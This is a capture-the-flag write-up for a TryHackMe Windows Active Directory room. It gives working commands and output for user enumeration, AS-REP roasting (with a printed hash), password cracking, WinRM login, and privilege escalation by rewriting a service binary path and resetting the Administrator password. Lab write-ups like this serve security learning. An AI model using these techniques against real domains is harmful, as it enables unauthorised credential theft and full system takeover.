# [Services](https://tryhackme.com/room/services)

## At your service.

# Get the user and root flag

## Meet the team!

### What is the user flag?

1. Initial enumeration with `nmap`:

```bash
nmap -sVC <TARGET_IP>
```

**Results:**

```
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        (generic dns response: SERVFAIL)
| fingerprint-strings:
|   DNS-SD-TCP:
|     _services
|     _dns-sd
|     _udp
|_    local
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: Above Services
|_http-server-header: Microsoft-IIS/10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-04-23 19:50:13Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: services.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: services.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-04-23T19:50:42+00:00; 0s from scanner time.
| rdp-ntlm-info:
|   Target_Name: SERVICES
|   NetBIOS_Domain_Name: SERVICES
|   NetBIOS_Computer_Name: WIN-SERVICES
|   DNS_Domain_Name: services.local
|   DNS_Computer_Name: WIN-SERVICES.services.local
|   Product_Version: 10.0.17763
|_  System_Time: 2026-04-23T19:50:33+00:00
| ssl-cert: Subject: commonName=WIN-SERVICES.services.local
| Not valid before: 2026-04-22T19:13:19
|_Not valid after:  2026-10-22T19:13:19
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.98%I=7%D=4/23%Time=69EA7804%P=x86_64-pc-linux-gnu%r(DNS-
SF:SD-TCP,30,"\0\.\0\0\x80\x82\0\x01\0\0\0\0\0\0\t_services\x07_dns-sd\x04
SF:_udp\x05local\0\0\x0c\0\x01");
Service Info: Host: WIN-SERVICES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2026-04-23T19:50:34
|_  start_date: N/A
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
```

2. Open `http://<TARGET_IP>/about.html` and inspect the team page. The footer shows the email format, so likely usernames are:

```
j.doe@services.local
j.rock@services.local
w.masters@services.local
j.larusso@services.local
```

3. Username enumeration with Kerbrute:

```bash
./kerbrute_linux_amd64 userenum --dc <TARGET_IP> -d services.local users.txt
```

**Results:**

```
2026/04/23 16:25:15 >  [+] VALID USERNAME:  j.doe@services.local
2026/04/23 16:25:15 >  [+] VALID USERNAME:  w.masters@services.local
2026/04/23 16:25:15 >  [+] VALID USERNAME:  j.larusso@services.local
2026/04/23 16:25:15 >  [+] VALID USERNAME:  j.rock@services.local
```

> This confirmed all four accounts as valid:

4. AS-REP roasting to find a crackable account:

```bash
impacket-GetNPUsers services.local/ -usersfile users.txt -request -format hashcat -dc-ip <TARGET_IP>
```

**Results:**

```
[-] User j.doe@services.local doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$j.rock@services.local@SERVICES.LOCAL:0c106901868e24aeddddd3a27d85edda$bded80cb85be3b46ed920d8e70143182419a99a7a510a527fe40fd45514912bfc233837fbeb4d0d9decce82b558b76f731ea8701e959bb887deee4f952e07b026f93a7b39456cd333f27a13f8061bf80bdbce43f9870cc0e74dd0d4fdac548b754c3b7eba33871ec81bfa80a19521d4c6c7f01323c5221623eab11620c3aa331f69c590bfcab7cfbdf4aef045045a14b3392229759ed9f0d633c550b4d9284fd23cc32aab8d7faa2db74c0ce50b302704c94932ca08df1416dbd7332df42693df1199a7a64618d0bd90e8bec5c62b9fa17e47c1eba9d1deffb9ea43eb76c5f2eb17d39aaea75a69489643a0b84bc0c56
[-] User w.masters@services.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User j.larusso@services.local doesn't have UF_DONT_REQUIRE_PREAUTH set
```

> Only `j.rock@services.local` returned an AS-REP hash, meaning that account has `UF_DONT_REQUIRE_PREAUTH` enabled:

5. Crack the hash with John the Ripper:

```bash
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```

6. Authenticate with Evil-WinRM:

```bash
evil-winrm -i <TARGET_IP> -u j.rock -p Serviceworks1
```

7. Read the user flag:

```bash
cd ../Desktop
dir
type user.txt
```

[SCREEN01]

---

### What is the Administrator flag?

1. Upload and run [PrivescCheck.ps1](https://github.com/itm4n/PrivescCheck):

```bash
cd ../Documents
upload PrivescCheck.ps1
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Report PrivescCheck_%COMPUTERNAME%"
```

2. Analyze the report:

**Results:**

```
Name              : ADWS
ImagePath         : C:\Windows\ADWS\Microsoft.ActiveDirectory.WebServices.exe
User              : LocalSystem
ModifiablePath    : HKLM\SYSTEM\CurrentControlSet\Services\ADWS
IdentityReference : BUILTIN\Server Operators (S-1-5-32-549)
Permissions       : QueryValue, SetValue, CreateSubKey, EnumerateSubKeys, Notify, Delete,
                    ReadControl, GenericWrite, GenericRead
Status            : Running
UserCanStart      : False
UserCanStop       : False
```

The important finding is the `ADWS` service:

- Running as `LocalSystem`
- Service path is modifiable

3. Abuse the service to add `j.rock` to the local Administrators group:

```bash
sc.exe config ADWS binpath="net localgroup administrators j.rock /add"
sc.exe stop adws
sc.exe start adws
# reconnect evil-winrm
```

4. Reconnect or verify privileges

5. Reset the Administrator password:

```bash
net user administrator superStrongpassword!23
```

6. Login as Administrator:

```bash
evil-winrm -i <TARGET_IP> -u administrator -p 'superStrongpassword!23'
```

7. Read the root flag:

```bash
cd ../Desktop
dir
type root.txt
```

[SCREEN02]
